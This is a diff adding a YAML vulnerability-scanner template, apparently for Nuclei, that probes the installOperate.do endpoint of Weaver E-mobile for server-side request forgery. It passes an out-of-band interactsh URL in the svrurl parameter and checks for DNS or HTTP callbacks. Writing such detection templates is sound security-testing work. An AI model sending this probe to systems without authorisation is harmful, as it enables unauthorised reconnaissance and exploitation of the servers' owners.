@@ -1,0 +1,22 @@
+id: poc-yaml-weaver-e-mobile-installoperate-do-ssrf
+
+info:
+  name: E-mobile installOperate.do SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dns
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/install/installOperate.do?svrurl=http://{{interactsh-url}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
